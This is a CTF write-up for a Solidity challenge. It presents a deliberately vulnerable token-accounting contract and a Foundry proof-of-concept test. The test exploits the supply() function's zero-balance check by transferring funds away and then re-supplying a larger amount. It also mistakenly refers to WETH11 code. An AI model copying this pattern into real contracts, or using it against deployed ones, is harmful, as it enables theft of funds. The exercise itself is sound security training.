# TemporaryVariable

## Challenge

Objective of CTF:
Your goal is to exploit a vulnerability in the contract to remove exactly double the amount you supply. Provide your solution as

user1 that supplies 100 units to the contract and removes 200 units. Use the foundry setup given below.
We also get the code for WETH11:

```solidity
//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

contract factory {
    address public owner;
    mapping(address => uint256) public _balances;
    mapping(address => bool) public _blacklist;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "you are not owner");
        _;
    }

    modifier isUserBlacklisted(address user) {
        require(_blacklist[user] == false, "user is blacklisted");
        _;
    }

    function blacklistuser(address user) public onlyOwner {
        uint256 balance = _balances[user];
        require(balance != 0, "user does not exist");
        _blacklist[user] = true;
    }

    function whitelistuser(address user) public onlyOwner {
        bool blacklist = _blacklist[user];
        require(blacklist == true, "user is not blacklisted");
        _blacklist[user] = false;
    }

    function supply(address _user, uint256 _amount) public {
        require(_user == msg.sender, "unauthorized");
        require(_balances[_user] == 0, "already exists");
        require(_amount > 0, "invalid amount");
        _balances[_user] += _amount;
        _blacklist[_user] = false;
    }

    function checkbalance(address _user) public view returns (uint256) {
        return _balances[_user];
    }

    function transfer(
        address _from,
        address _to,
        uint256 _amount
    ) public isUserBlacklisted(_from) {
        uint256 frombalance = _balances[_from];
        uint256 tobalance = _balances[_to];
        require(_from == msg.sender, "unauthorized");
        require(frombalance != 0, "no balance");
        require(tobalance != 0, "unknown user");
        require(_amount <= frombalance, "not enough balance");

        _balances[_from] = frombalance - _amount;
        _balances[_to] = tobalance + _amount;
    }

    function remove(
        address _from,
        uint256 _amount
    ) public isUserBlacklisted(_from) {
        require(_from == msg.sender, "unauthorized");
        uint256 _accountbalance = _balances[_from];
        require(_amount <= _accountbalance, "not enough balance");

        if (_amount == _accountbalance) {
            delete _balances[_from];
            delete _blacklist[_from];
        } else {
            _accountbalance -= _amount;
            _balances[_from] = _accountbalance;
        }
    }
}
```

## Solution

The issue is that supply only checks if the user to supply to has a balance of 0. So you can just send your money to someone else and then supply as much as you want to yourself.

This can be seen in the POC:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/factory.sol";

contract testfactory is
    Test,
    factory
{    
    factory _factory;
    address user1 = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    address user2 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
    function setUp() public {
        vm.prank(owner);
        _factory = new factory();

        vm.deal (user1 , 100);
        vm.deal (user2 , 100);

        vm.prank(user1);
        _factory.supply(user1, 100);
        vm.prank(user2);
        _factory.supply(user2, 100);
    }

    function testFactory() public {
        vm.prank(user1);

        //solution
        _factory.transfer(user1, user2, 100);

        vm.prank(user1);
        _factory.supply(user1, 200);

        uint256 newbalance = _factory.checkbalance(user1);
        assertEq(newbalance, 200);
    }
}
```